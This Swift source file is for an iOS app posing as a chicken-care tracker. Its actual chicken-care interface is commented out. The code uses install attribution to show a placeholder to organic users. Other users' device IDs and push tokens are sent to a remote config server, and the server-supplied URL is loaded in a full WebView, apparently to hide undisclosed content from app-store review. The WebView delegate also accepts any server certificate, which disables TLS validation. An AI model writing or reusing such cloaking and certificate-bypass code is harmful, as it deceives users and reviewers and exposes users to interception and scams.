import SwiftUI
import AppsFlyerLib
import FirebaseMessaging
import UserNotifications
import WebKit
import Network
import AppTrackingTransparency
import FirebaseCore

class AppDelegate: UIResponder, UIApplicationDelegate, AppsFlyerLibDelegate, MessagingDelegate, UNUserNotificationCenterDelegate, DeepLinkDelegate {
    
    
    let appsFlyerDevKey = "oRtPVwE9ggB3p6wgnaKiBh"
    let appleAppID = "6754910989"
  //  let endPoint = "https://turnsscoreapp.com"
    
    var window: UIWindow?
    private var conversionData: [AnyHashable: Any] = [:]
    private var isFirstLaunch: Bool = true
    
    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        // Initialize Firebase
        FirebaseApp.configure()
        
        // Initialize AppsFlyer
        AppsFlyerLib.shared().appsFlyerDevKey = appsFlyerDevKey
        AppsFlyerLib.shared().appleAppID = appleAppID
        AppsFlyerLib.shared().delegate = self
        AppsFlyerLib.shared().deepLinkDelegate = self
        AppsFlyerLib.shared().start()
        
        // Firebase Messaging delegat
        Messaging.messaging().delegate = self
        
        UNUserNotificationCenter.current().delegate = self
        
        application.registerForRemoteNotifications()
        
        if let remoteNotification = launchOptions?[.remoteNotification] as? [AnyHashable: Any] {
            handleNotificationPayload(remoteNotification)
        }
        
        let monitor = NWPathMonitor()
        monitor.pathUpdateHandler = { path in
            if path.status != .satisfied {
                self.handleNoInternet()
                return
            }
        }
        monitor.start(queue: DispatchQueue.global())
        
        NotificationCenter.default.addObserver(
            self,
            selector: #selector(activateApps),
            name: UIApplication.didBecomeActiveNotification,
            object: nil
        )
        
        return true
    }
    
    func didResolveDeepLink(_ result: DeepLinkResult) {
        
        switch result.status {
        case .notFound:
            AppsFlyerLib.shared().logEvent(name: "DeepLinkNotFound", values: nil)
            return
            
        case .failure:
            if let error = result.error {
                AppsFlyerLib.shared().logEvent(name: "DeepLinkError", values: nil)
            } else {
                print("[AFSDK] Deep link error: unknown")
                AppsFlyerLib.shared().logEvent(name: "DeepLinkError", values: nil)
            }
            return
            
        case .found:
            AppsFlyerLib.shared().logEvent(name: "DeepLinkFound", values: nil)

            guard let deepLink = result.deepLink else {
                AppsFlyerLib.shared().logEvent(name: "NoDeepLinkData", values: nil)
                print("[AFSDK] No deep link data")
                return
            }

            // Проверка на deferred / direct
            let isDeferred = deepLink.isDeferred ?? false
            print(isDeferred ? "This is a deferred deep link" : "This is a direct deep link")

            // Извлечение параметров диплинка
            var deepLinkParams: [String: Any] = [:]

            if let clickEventDict = (deepLink.clickEvent["click_event"] as? [String: Any]) {
                deepLinkParams = clickEventDict
            } else {
                deepLinkParams = deepLink.clickEvent
            }
        
            self.conversionData.merge(deepLinkParams) { (_, new) in new }
        }
    }
    
    
    @objc private func activateApps() {
        AppsFlyerLib.shared().start()
        if #available(iOS 14, *) {
            ATTrackingManager.requestTrackingAuthorization { status in
            }
        }
    }
    
    // AppsFlyer Delegate Methods
    func onConversionDataSuccess(_ data: [AnyHashable: Any]) {
        conversionData.merge(data) { (_, new) in new }
        NotificationCenter.default.post(name: Notification.Name("ConversionDataReceived"), object: nil, userInfo: ["conversionData": conversionData])
    }
    
    func onConversionDataFail(_ error: Error) {
        NotificationCenter.default.post(name: Notification.Name("ConversionDataReceived"), object: nil, userInfo: ["conversionData": [:]])
//        if UserDefaults.standard.string(forKey: "saved_url") == nil {
//            setModeToFuntik()
//        }
    }
    
    private func handleConfigError() {
        if let savedURL = UserDefaults.standard.string(forKey: "saved_url") {
            DispatchQueue.main.async {
                NotificationCenter.default.post(name: NSNotification.Name("UpdateUI"), object: nil)
            }
        } else {
            setModeToFuntik()
        }
    }
    
    private func setModeToFuntik() {
        UserDefaults.standard.set("Funtik", forKey: "app_mode")
        DispatchQueue.main.async {
            NotificationCenter.default.post(name: NSNotification.Name("UpdateUI"), object: nil)
        }
    }
    
    private func handleNoInternet() {
        let mode = UserDefaults.standard.string(forKey: "app_mode")
        if mode == "WebView" {
            DispatchQueue.main.async {
                NotificationCenter.default.post(name: NSNotification.Name("ShowNoInternet"), object: nil)
            }
        } else {
            setModeToFuntik()
        }
    }
    
    func messaging(_ messaging: Messaging, didReceiveRegistrationToken fcmToken: String?) {
        // Upon token update, send new request
        messaging.token { token, error in
            if let error = error {
            }
            UserDefaults.standard.set(token, forKey: "fcm_token")
        }
        // sendConfigRequest()
    }
    
    // APNS Token
    func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
        Messaging.messaging().apnsToken = deviceToken
    }
    
    func application(_ application: UIApplication, didFailToRegisterForRemoteNotificationsWithError error: Error) {
    }
    
    // Notification Delegates
    func userNotificationCenter(_ center: UNUserNotificationCenter, willPresent notification: UNNotification, withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void) {
        let userInfo = notification.request.content.userInfo
        handleNotificationPayload(userInfo)
        completionHandler([.banner, .sound])
    }
    
    func userNotificationCenter(_ center: UNUserNotificationCenter, didReceive response: UNNotificationResponse, withCompletionHandler completionHandler: @escaping () -> Void) {
        let userInfo = response.notification.request.content.userInfo
        handleNotificationPayload(userInfo)
        completionHandler()
    }
    
    func application(_ application: UIApplication,
                             didReceiveRemoteNotification userInfo: [AnyHashable : Any],
                     fetchCompletionHandler completionHandler: @escaping (UIBackgroundFetchResult) -> Void) {
        handleNotificationPayload(userInfo)
        completionHandler(.newData)
    }
    
    private func handleNotificationPayload(_ userInfo: [AnyHashable: Any]) {
        var urlString: String?
        if let url = userInfo["url"] as? String {
            urlString = url
        } else if let data = userInfo["data"] as? [String: Any], let url = data["url"] as? String {
            urlString = url
        }
        
        if let urlString = urlString {
            UserDefaults.standard.set(urlString, forKey: "temp_url")
            DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
                NotificationCenter.default.post(name: NSNotification.Name("LoadTempURL"), object: nil, userInfo: ["tempUrl": urlString])
            }
        }
    }
    
    private func showNotificationPermissionScreen() {
        // Check if already asked and time elapsed
        if let lastAsk = UserDefaults.standard.value(forKey: "last_notification_ask") as? Date,
           Date().timeIntervalSince(lastAsk) < 259200 {
            return
        }
        
        // Show custom screen via notification or something, handled in SwiftUI
        DispatchQueue.main.async {
            NotificationCenter.default.post(name: NSNotification.Name("ShowNotificationScreen"), object: nil)
        }
    }
}

// Define colors based on the design from screenshots
extension Color {
    static let warmWhite = Color(hex: "#FFF9E6") // Background
    static let sunnyYellow = Color(hex: "#FFD93D") // Eggs, buttons
    static let coralPink = Color(hex: "#FF6B6B") // Accents, charts
    static let skyBlue = Color(hex: "#4A90E2") // Chickens, buttons
    static let freshGreen = Color(hex: "#3DD598") // Health, trends
    static let goldenOrange = Color(hex: "#FFB84C") // Tabs, accents
    static let violetPurple = Color(hex: "#A259FF") // Freshness status
    static let darkText = Color(hex: "#333333") // Main text
    static let grayText = Color(hex: "#6B7280") // Subtext
    
    init(hex: String) {
        let hex = hex.trimmingCharacters(in: CharacterSet.alphanumerics.inverted)
        var int: UInt64 = 0
        Scanner(string: hex).scanHexInt64(&int)
        let a, r, g, b: UInt64
        switch hex.count {
        case 3: (a, r, g, b) = (255, (int >> 8) * 17, (int >> 4 & 0xF) * 17, (int & 0xF) * 17)
        case 6: (a, r, g, b) = (255, int >> 16, int >> 8 & 0xFF, int & 0xFF)
        case 8: (a, r, g, b) = (int >> 24, int >> 16 & 0xFF, int >> 8 & 0xFF, int & 0xFF)
        default: (a, r, g, b) = (255, 255, 255, 255)
        }
        self.init(
            .sRGB,
            red: Double(r) / 255,
            green: Double(g) / 255,
            blue: Double(b) / 255,
            opacity: Double(a) / 255
        )
    }
    
    static func getColorFromName(_ name: String, default: Color = .gray) -> Color {
        switch name {
        case "freshGreen": return .freshGreen
        case "sunnyYellow": return .sunnyYellow
        case "coralPink": return .coralPink
        default: return `default`
        }
    }
}

class AppState: ObservableObject {
    
}

struct NoInternetView: View {
    var retryAction: () -> Void
    
    var body: some View {
        VStack {
            Text("No Internet Connection")
            Button("Retry") {
                retryAction()
            }
        }
    }
}

struct NotificationPermissionView: View {
    var onYes: () -> Void
    var onSkip: () -> Void
    
    var body: some View {
        GeometryReader { geometry in
            let isLandscape = geometry.size.width > geometry.size.height
            
            ZStack {
                if isLandscape {
                    Image("splash_back_land")
                        .resizable()
                        .scaledToFill()
                        .frame(width: geometry.size.width, height: geometry.size.height)
                        .ignoresSafeArea()
                } else {
                    Image("notifications_back")
                        .resizable()
                        .scaledToFill()
                        .frame(width: geometry.size.width, height: geometry.size.height)
                        .ignoresSafeArea()
                }
                
                VStack(spacing: isLandscape ? 10 : 20) {
                    Spacer()
                    
                    if isLandscape {
                        Image("title_1")
                            .resizable()
                            .frame(width: 520, height: 20)
                        Image("title_2")
                            .resizable()
                            .frame(width: 450, height: 20)
                            .padding(.bottom)
                    }
                    
                    Button(action: onYes) {
                        Image("want_btn")
                            .resizable()
                            .scaledToFit()
                            .frame(
                                width: isLandscape ? geometry.size.width * 0.6 : 350,
                                height: isLandscape ? 50 : 70
                            )
                    }
                    
                    Button(action: onSkip) {
                        Image("skip_btn")
                            .resizable()
                            .scaledToFit()
                            .frame(
                                width: isLandscape ? geometry.size.width * 0.2 : 50,
                                height: isLandscape ? 15 : 20
                            )
                    }
                    
                    Spacer()
                        .frame(height: isLandscape ? 20 : 10)
                }
                .padding(.horizontal, isLandscape ? 20 : 0)
            }
            
        }
        .ignoresSafeArea()
    }
}

#Preview {
    ContentView()
        .environmentObject(AppState())
}

class SplashViewModel: ObservableObject {
    @Published var currentScreen: Screen = .loading
    @Published var webViewURL: URL?
    @Published var showNotificationScreen = false
    
    private var conversionData: [AnyHashable: Any] = [:]
    private var isFirstLaunch: Bool {
        !UserDefaults.standard.bool(forKey: "hasLaunched")
    }
    
    enum Screen {
        case loading
        case webView
        case funtik
        case noInternet
        case screamAndRush
    }
    
    init() {
        // Setup notification observers
        NotificationCenter.default.addObserver(self, selector: #selector(handleConversionData(_:)), name: NSNotification.Name("ConversionDataReceived"), object: nil)
        NotificationCenter.default.addObserver(self, selector: #selector(handleConversionError(_:)), name: NSNotification.Name("ConversionDataFailed"), object: nil)
        NotificationCenter.default.addObserver(self, selector: #selector(handleFCMToken(_:)), name: NSNotification.Name("FCMTokenUpdated"), object: nil)
        NotificationCenter.default.addObserver(self, selector: #selector(retryConfig), name: NSNotification.Name("RetryConfig"), object: nil)
        
        // Start processing
        checkInternetAndProceed()
    }
    
    deinit {
        NotificationCenter.default.removeObserver(self)
    }
    
    private func checkInternetAndProceed() {
        let monitor = NWPathMonitor()
        monitor.pathUpdateHandler = { path in
            DispatchQueue.main.async {
                if path.status != .satisfied {
                    self.handleNoInternet()
                } else {
                    // self.checkExpiresAndRequest()
                }
            }
        }
        monitor.start(queue: DispatchQueue.global())
    }
    
    @objc private func handleConversionData(_ notification: Notification) {
        var pushData = (notification.userInfo ?? [:])["conversionData"] as? [AnyHashable: Any] ?? [:]
        conversionData.merge(pushData) { (_, new) in new }
        processConversionData()
    }
    
    @objc private func handleConversionError(_ notification: Notification) {
        handleConfigError()
    }
    
    @objc private func handleFCMToken(_ notification: Notification) {
        // Trigger new config request on token update
        if let token = notification.object as? String {
            UserDefaults.standard.set(token, forKey: "fcm_token")
            // sendConfigRequest()
        }
    }
    
    @objc private func handleNotificationURL(_ notification: Notification) {
        guard let userInfo = notification.userInfo as? [String: Any],
              let tempUrl = userInfo["tempUrl"] as? String else {
            return
        }
        
        DispatchQueue.main.async {
            self.webViewURL = URL(string: tempUrl)!
            self.currentScreen = .webView
        }
    }
    
    @objc private func retryConfig() {
        checkInternetAndProceed()
    }
    
    private func processConversionData() {
        guard !conversionData.isEmpty else { return }
        
        if UserDefaults.standard.string(forKey: "app_mode") == "Funtik" {
            DispatchQueue.main.async {
                self.currentScreen = .funtik
            }
            return
        }
        
        if isFirstLaunch {
            if let afStatus = conversionData["af_status"] as? String, afStatus == "Organic" {
                self.setModeToFuntik()
                return
            }
        }
        
        if let link = UserDefaults.standard.string(forKey: "temp_url"), !link.isEmpty {
            webViewURL = URL(string: link)
            self.currentScreen = .webView
            return
        }
        
        // усли не с пуша открыли запрашиваем
        if webViewURL == nil {
            sendConfigRequest()
//            if !UserDefaults.standard.bool(forKey: "accepted_notifications") && !UserDefaults.standard.bool(forKey: "system_close_notifications") {
//                checkAndShowNotificationScreen()
//            } else {
//                
//            }
        }
    }
    
    func sendConfigRequest() {
        guard let url = URL(string: "https://turnsscoreapp.com/config.php") else {
            handleConfigError()
            return
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        
        var body = conversionData
        body["af_id"] = AppsFlyerLib.shared().getAppsFlyerUID()
        body["bundle_id"] = Bundle.main.bundleIdentifier ?? "com.example.app"
        body["os"] = "iOS"
        body["store_id"] = "id6754910989"
        body["locale"] = Locale.preferredLanguages.first?.prefix(2).uppercased() ?? "EN"
        body["push_token"] = UserDefaults.standard.string(forKey: "fcm_token") ?? Messaging.messaging().fcmToken
        body["firebase_project_id"] = FirebaseApp.app()?.options.gcmSenderID
        
        do {
            request.httpBody = try JSONSerialization.data(withJSONObject: body)
        } catch {
            handleConfigError()
            return
        }
        
        URLSession.shared.dataTask(with: request) { data, response, error in
            DispatchQueue.main.async {
                if let _ = error {
                    self.handleConfigError()
                    return
                }
                
                guard let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 200,
                      let data = data else {
                    self.handleConfigError()
                    return
                }
                
                do {
                    if let json = try JSONSerialization.jsonObject(with: data) as? [String: Any] {
                        if let ok = json["ok"] as? Bool, ok {
                            if let urlString = json["url"] as? String, let expires = json["expires"] as? TimeInterval {
                                UserDefaults.standard.set(urlString, forKey: "saved_url")
                                UserDefaults.standard.set(expires, forKey: "saved_expires")
                                UserDefaults.standard.set("WebView", forKey: "app_mode")
                                UserDefaults.standard.set(true, forKey: "hasLaunched")
                                self.webViewURL = URL(string: urlString)
                                self.currentScreen = .webView
                                
                                if self.isFirstLaunch {
                                    self.checkAndShowNotificationScreen()
                                }
                            }
                        } else {
                            self.setModeToFuntik()
                        }
                    }
                } catch {
                    self.handleConfigError()
                }
            }
        }.resume()
    }
    
    private func handleConfigError() {
        if let savedURL = UserDefaults.standard.string(forKey: "saved_url"), let url = URL(string: savedURL) {
            webViewURL = url
            currentScreen = .webView
        } else {
            setModeToFuntik()
        }
    }
    
    private func setModeToFuntik() {
        UserDefaults.standard.set("Funtik", forKey: "app_mode")
        UserDefaults.standard.set(true, forKey: "hasLaunched")
        
        if let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
           let window = windowScene.windows.first {
            print("open funtik")
            window.rootViewController = UIHostingController(rootView: MeasurementToolkitWrapperView())
        }
//        DispatchQueue.main.async {
//            //self.currentScreen = .funtik
//        }
    }
    
    private func handleNoInternet() {
        let mode = UserDefaults.standard.string(forKey: "app_mode")
        if mode == "WebView" {
            DispatchQueue.main.async {
                self.currentScreen = .noInternet
            }
        } else {
            setModeToFuntik()
        }
    }
    
//    private func checkExpiresAndRequest() {
//        if let expires = UserDefaults.standard.value(forKey: "saved_expires") as? TimeInterval,
//           expires < Date().timeIntervalSince1970 {
//            sendConfigRequest()
//        } else if let savedURL = UserDefaults.standard.string(forKey: "saved_url"),
//                  let url = URL(string: savedURL) {
//            webViewURL = url
//            currentScreen = .webView
//        } else {
//            if conversionData == nil {
//                currentScreen = .loading
//            } else {
//                sendConfigRequest()
//            }
//        }
//    }
    
    private func checkAndShowNotificationScreen() {
        if let lastAsk = UserDefaults.standard.value(forKey: "last_notification_ask") as? Date,
           Date().timeIntervalSince(lastAsk) < 259200 {
            sendConfigRequest()
            return
        }
        showNotificationScreen = true
    }
    
    func requestNotificationPermission() {
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { granted, error in
            DispatchQueue.main.async {
                if granted {
                    UserDefaults.standard.set(true, forKey: "accepted_notifications")
                    UIApplication.shared.registerForRemoteNotifications()
                } else {
                    UserDefaults.standard.set(false, forKey: "accepted_notifications")
                    UserDefaults.standard.set(true, forKey: "system_close_notifications")
                }
                self.sendConfigRequest()
                self.showNotificationScreen = false
                if let error = error {
                    print("Permission error: \(error)")
                }
            }
        }
    }
}

struct SplashView: View {
    
    @EnvironmentObject var appState: AppState
    @StateObject private var viewModel = SplashViewModel()
    
    @State var alertVisible = false
    @State var alertMessage = ""
    
    var body: some View {
        ZStack {
            if viewModel.currentScreen == .loading || viewModel.showNotificationScreen {
                splashScreen
            }
            
            if viewModel.showNotificationScreen {
                NotificationPermissionView(
                    onYes: {
                        viewModel.requestNotificationPermission()
                    },
                    onSkip: {
                        UserDefaults.standard.set(Date(), forKey: "last_notification_ask")
                        viewModel.showNotificationScreen = false
                        viewModel.sendConfigRequest()
                    }
                )
            } else {
                switch viewModel.currentScreen {
                case .loading:
                    EmptyView()
                case .webView:
                    if let url = viewModel.webViewURL {
                        CoreInterfaceView()
                        // MainBrowserView(destinationLink: url)
                    } else {
                        ContentView()
                            .environmentObject(appState)
                    }
                case .funtik:
                    ContentView()
                        .environmentObject(appState)
                case .noInternet:
                    NoInternetView {
                        NotificationCenter.default.post(name: NSNotification.Name("RetryConfig"), object: nil)
                    }
                case .screamAndRush:
                    ContentView()
                        .environmentObject(appState)
                }
            }
        }
        .onReceive(NotificationCenter.default.publisher(for: Notification.Name("show_alert"))) { notification in
            let data = (notification.userInfo as? [String: Any])?["data"] as? String
            alertVisible = true
            alertMessage = "data: \(data)"
        }
        .alert(isPresented: $alertVisible) {
            Alert(title: Text("Alert"), message: Text(alertMessage))
        }
    }
    
    @State private var animate = false
    
    private var splashScreen: some View {
        GeometryReader { geometry in
            let isLandscape = geometry.size.width > geometry.size.height
            
            ZStack {
                if isLandscape {
                    Image("splash_back_land")
                        .resizable()
                        .scaledToFill()
                        .frame(width: geometry.size.width, height: geometry.size.height)
                        .ignoresSafeArea()
                } else {
                    Image("splash_back")
                        .resizable()
                        .scaledToFill()
                        .frame(width: geometry.size.width, height: geometry.size.height)
                        .ignoresSafeArea()
                }
                
                VStack {
                    Spacer()
                    
                    HStack(alignment: .bottom) {
                        Image("loading_ic")
                            .resizable()
                            .frame(width: 150, height: 25)
                        
                        ForEach(1..<4) { i in
                            Image("loading_point_ic")
                                .resizable()
                                .frame(width: 16, height: 16)
                                .offset(y: animate ? -8 : 8) // Move up and down
                                .animation(
                                    Animation.easeInOut(duration: 0.6)
                                        .repeatForever(autoreverses: true)
                                        .delay(Double(i) * 0.1),
                                    value: animate
                                )
                        }
                    }
                    
                    Spacer()
                        .frame(height: isLandscape ? 30 : 100)
                }
            }
            
        }
        .ignoresSafeArea()
        .onAppear {
            animate = true
        }
    }
    
}


#Preview {
    SplashView()
        .environmentObject(AppState())
}

// Main App
@main
struct ChickenCareApp: App {
    
    @UIApplicationDelegateAdaptor(AppDelegate.self) var delegate
    @StateObject private var appState = AppState()
    
    var body: some Scene {
        WindowGroup {
            if UserDefaults.standard.string(forKey: "app_mode") == "Funtik" {
                MeasurementToolkitWrapperView()
            } else {
                SplashView()
                    .environmentObject(appState)
            }
        }
    }
}

struct ContentView: View {
    @EnvironmentObject var appState: AppState
    @State private var selectedTab: String = "home"
    
    var body: some View {
//        TabView(selection: $selectedTab) {
//            HomeDashboardView(selectedTab: $selectedTab)
//                .tabItem {
//                    VStack {
//                        Image(systemName: "house")
//                        Text("Home")
//                    }
//                }
//                .tag("home")
//            
//            ChickenManagerView()
//                .tabItem {
//                    VStack {
//                        Image(systemName: "person.3")
//                        Text("Chickens")
//                    }
//                }
//                .tag("chickens")
//            
//            EggLogView()
//                .tabItem {
//                    VStack {
//                        Image(systemName: "oval")
//                        Text("Eggs")
//                    }
//                }
//                .tag("eggs")
//            
//            FreshnessCheckerView()
//                .tabItem {
//                    VStack {
//                        Image(systemName: "thermometer")
//                        Text("Freshness")
//                    }
//                }
//                .tag("freshness")
//            
//            StatsView()
//                .tabItem {
//                    VStack {
//                        Image(systemName: "chart.bar")
//                        Text("Stats")
//                    }
//                }
//                .tag("stats")
//        }
//        .accentColor(.goldenOrange)
//        .background(Color.warmWhite)
//        .font(.system(.body, design: .rounded))
    }
}

struct OverviewCard: View {
    let title: String
    let value: String
    let icon: String
    let gradient: LinearGradient
    
    var body: some View {
        HStack(spacing: 12) {
            Image(systemName: icon)
                .font(.subheadline)
                .foregroundColor(.white)
                .frame(width: 24, height: 24)
                .background(Circle().fill(Color.white.opacity(0.3)))
            
            VStack(alignment: .leading, spacing: 2) {
                Text(title)
                    .font(.caption)
                    .foregroundColor(.white.opacity(0.8))
                Text(value)
                    .font(.title3.bold())
                    .foregroundColor(.white)
            }
            Spacer()
        }
        .padding()
        .background(gradient)
        .cornerRadius(20)
    }
}

struct QuickActionButton: View {
    let icon: String
    let title: String
    
    var body: some View {
        VStack(spacing: 8) {
            Image(systemName: icon)
                .font(.title2)
                .foregroundColor(.grayText)
            Text(title)
                .font(.caption)
                .foregroundColor(.grayText)
        }
        .frame(maxWidth: .infinity)
        .padding(.vertical, 16)
        .background(Color.white)
        .cornerRadius(12)
        .shadow(color: .black.opacity(0.05), radius: 2, x: 0, y: 1)
    }
}

struct ToggleButton: View {
    let title: String
    let isSelected: Bool
    let action: () -> Void
    
    var body: some View {
        Button(action: action) {
            Text(title)
                .font(.subheadline.bold())
                .padding(.horizontal, 16)
                .padding(.vertical, 8)
                .background(isSelected ? Color.coralPink : Color.white)
                .foregroundColor(isSelected ? .white : .grayText)
                .cornerRadius(20)
                .shadow(color: .black.opacity(isSelected ? 0.1 : 0), radius: 2, x: 0, y: 1)
        }
    }
}

class BrowserDelegateManager: NSObject, WKNavigationDelegate, WKUIDelegate {
    private let contentManager: ContentManager
    
    private var redirectCount: Int = 0
    private let maxRedirects: Int = 70 // Для тестов
    private var lastValidURL: URL?

    func webView(_ webView: WKWebView, didReceive challenge: URLAuthenticationChallenge, completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
        let space = challenge.protectionSpace
        if space.authenticationMethod == NSURLAuthenticationMethodServerTrust {
            if let trust = space.serverTrust {
                let cred = URLCredential(trust: trust)
                completionHandler(.useCredential, cred)
            } else {
                completionHandler(.performDefaultHandling, nil)
            }
        } else {
            completionHandler(.performDefaultHandling, nil)
        }
    }
    
    init(manager: ContentManager) {
        self.contentManager = manager
        super.init()
    }
    
    func webView(
        _ webView: WKWebView,
        createWebViewWith configuration: WKWebViewConfiguration,
        for navigationAction: WKNavigationAction,
        windowFeatures: WKWindowFeatures
    ) -> WKWebView? {
        guard navigationAction.targetFrame == nil else {
            return nil
        }
        
        let newBrowser = BrowserCreator.createPrimaryBrowser(with: configuration)
        setupNewBrowser(newBrowser)
        attachNewBrowser(newBrowser)
        
        contentManager.additionalBrowsers.append(newBrowser)
        if shouldLoadRequest(in: newBrowser, with: navigationAction.request) {
            newBrowser.load(navigationAction.request)
        }
        return newBrowser
    }
    
    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        // Enforce no-zoom policy with viewport and CSS overrides
        let script = """
                var viewportMeta = document.createElement('meta');
                viewportMeta.name = 'viewport';
                viewportMeta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
                document.getElementsByTagName('head')[0].appendChild(viewportMeta);
                var cssOverride = document.createElement('style');
                cssOverride.textContent = 'body { touch-action: pan-x pan-y; } input, textarea, select { font-size: 16px !important; maximum-scale=1.0; }';
                document.getElementsByTagName('head')[0].appendChild(cssOverride);
                document.addEventListener('gesturestart', function(e) { e.preventDefault(); });
                """;
        webView.evaluateJavaScript(script) { _, error in
            if let error = error {
                print("Script injection error: \(error)")
            }
        }
        
    }
    
    func webView(_ webView: WKWebView, didReceiveServerRedirectForProvisionalNavigation navigation: WKNavigation!) {
        redirectCount += 1
        if redirectCount > maxRedirects {
            webView.stopLoading()
            if let fallbackURL = lastValidURL {
                webView.load(URLRequest(url: fallbackURL))
            }
            return
        }
        lastValidURL = webView.url // Сохраняем последний рабочий URL
        saveCookies(from: webView)
    }
    
    func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
        if (error as NSError).code == NSURLErrorHTTPTooManyRedirects, let fallbackURL = lastValidURL {
            webView.load(URLRequest(url: fallbackURL))
        }
    }
    
    func webView(
        _ webView: WKWebView,
        decidePolicyFor navigationAction: WKNavigationAction,
        decisionHandler: @escaping (WKNavigationActionPolicy) -> Void
    ) {
        guard let link = navigationAction.request.url else {
            decisionHandler(.allow)
            return
        }
        
        if link.absoluteString.starts(with: "http") || link.absoluteString.starts(with: "https") {
            lastValidURL = link
            decisionHandler(.allow)
        } else {
            UIApplication.shared.open(link, options: [:], completionHandler: nil)
            decisionHandler(.cancel)
        }
    }
    
    private func setupNewBrowser(_ browser: WKWebView) {
        browser.translatesAutoresizingMaskIntoConstraints = false
        browser.scrollView.isScrollEnabled = true
        browser.scrollView.minimumZoomScale = 1.0
        browser.scrollView.maximumZoomScale = 1.0
        browser.scrollView.bouncesZoom = false
        browser.allowsBackForwardNavigationGestures = true
        browser.navigationDelegate = self
        browser.uiDelegate = self
        contentManager.primaryBrowser.addSubview(browser)
        
        // Добавляем свайп для наложенного WKWebView
        let edgePan = UIScreenEdgePanGestureRecognizer(target: self, action: #selector(handleEdgePan(_:)))
        edgePan.edges = .left
        browser.addGestureRecognizer(edgePan)
    }
    
    private func attachNewBrowser(_ browser: WKWebView) {
        NSLayoutConstraint.activate([
            browser.leadingAnchor.constraint(equalTo: contentManager.primaryBrowser.leadingAnchor),
            browser.trailingAnchor.constraint(equalTo: contentManager.primaryBrowser.trailingAnchor),
            browser.topAnchor.constraint(equalTo: contentManager.primaryBrowser.topAnchor),
            browser.bottomAnchor.constraint(equalTo: contentManager.primaryBrowser.bottomAnchor)
        ])
    }
    
    private func shouldLoadRequest(in browser: WKWebView, with request: URLRequest) -> Bool {
        if let urlString = request.url?.absoluteString, !urlString.isEmpty, urlString != "about:blank" {
            return true
        }
        return false
    }
    
    private func saveCookies(from browser: WKWebView) {
        browser.configuration.websiteDataStore.httpCookieStore.getAllCookies { cookies in
            var cookiesByDomain: [String: [String: [HTTPCookiePropertyKey: Any]]] = [:]
            for cookie in cookies {
                var domainCookies = cookiesByDomain[cookie.domain] ?? [:]
                domainCookies[cookie.name] = cookie.properties as? [HTTPCookiePropertyKey: Any]
                cookiesByDomain[cookie.domain] = domainCookies
            }
            UserDefaults.standard.set(cookiesByDomain, forKey: "stored_cookies")
        }
    }
}

struct BrowserCreator {
    
    static func createPrimaryBrowser(with config: WKWebViewConfiguration? = nil) -> WKWebView {
        let configuration = config ?? buildConfiguration()
        return WKWebView(frame: .zero, configuration: configuration)
    }
    
    private static func buildConfiguration() -> WKWebViewConfiguration {
        let config = WKWebViewConfiguration()
        config.allowsInlineMediaPlayback = true
        config.preferences = buildPreferences()
        config.defaultWebpagePreferences = buildWebpagePreferences()
        config.requiresUserActionForMediaPlayback = false
        return config
    }
    
    private static func buildPreferences() -> WKPreferences {
        let preferences = WKPreferences()
        preferences.javaScriptEnabled = true
        preferences.javaScriptCanOpenWindowsAutomatically = true
        return preferences
    }
    
    private static func buildWebpagePreferences() -> WKWebpagePreferences {
        let preferences = WKWebpagePreferences()
        preferences.allowsContentJavaScript = true
        return preferences
    }
    
    static func shouldCleanAdditional(_ primary: WKWebView, _ additions: [WKWebView], currentLink: URL?) -> Bool {
        if !additions.isEmpty {
            additions.forEach { $0.removeFromSuperview() }
            if let link = currentLink {
                primary.load(URLRequest(url: link))
            }
            return true
        } else if primary.canGoBack {
            primary.goBack()
            return false
        }
        return false
    }
}

extension Notification.Name {
    static let interfaceActions = Notification.Name("ui_actions")
}

class ContentManager: ObservableObject {
    @Published var primaryBrowser: WKWebView!
    @Published var additionalBrowsers: [WKWebView] = []
    
    func setupPrimaryBrowser() {
        primaryBrowser = BrowserCreator.createPrimaryBrowser()
        primaryBrowser.scrollView.minimumZoomScale = 1.0
        primaryBrowser.scrollView.maximumZoomScale = 1.0
        primaryBrowser.scrollView.bouncesZoom = false
        primaryBrowser.allowsBackForwardNavigationGestures = true
    }
    
    func loadStoredCookies() {
        guard let storedCookies = UserDefaults.standard.dictionary(forKey: "stored_cookies") as? [String: [String: [HTTPCookiePropertyKey: AnyObject]]] else { return }
        let cookieStore = primaryBrowser.configuration.websiteDataStore.httpCookieStore
        
        storedCookies.values.flatMap { $0.values }.forEach { properties in
            if let cookie = HTTPCookie(properties: properties as! [HTTPCookiePropertyKey: Any]) {
                cookieStore.setCookie(cookie)
            }
        }
    }
    
    func refreshContent() {
        primaryBrowser.reload()
    }
    
    func cleanAdditionalBrowsersIfNeeded(for link: URL?) {
//        if BrowserCreator.shouldCleanAdditional(primaryBrowser, additionalBrowsers, currentLink: link) {
//            additionalBrowsers.removeAll()
//        }
        
        
    }
    
    func shouldCleanAdditional(currentLink: URL?) {
        if !additionalBrowsers.isEmpty {
            if let lastOverlay = additionalBrowsers.last {
                lastOverlay.removeFromSuperview()
                additionalBrowsers.removeLast()
            }
            if let link = currentLink {
                primaryBrowser.load(URLRequest(url: link))
            }
        } else if primaryBrowser.canGoBack {
            primaryBrowser.goBack()
        }
    }
    
    func closeTopOverlay() {
        if let lastOverlay = additionalBrowsers.last {
            lastOverlay.removeFromSuperview()
            additionalBrowsers.removeLast()
            //objectWillChange.send()
        }
    }
    
}

struct MainBrowserView: UIViewRepresentable {
    let destinationLink: URL
    @StateObject private var manager = ContentManager()
    
    func makeUIView(context: Context) -> WKWebView {
        manager.setupPrimaryBrowser()
        manager.primaryBrowser.uiDelegate = context.coordinator
        manager.primaryBrowser.navigationDelegate = context.coordinator
    
        manager.loadStoredCookies()
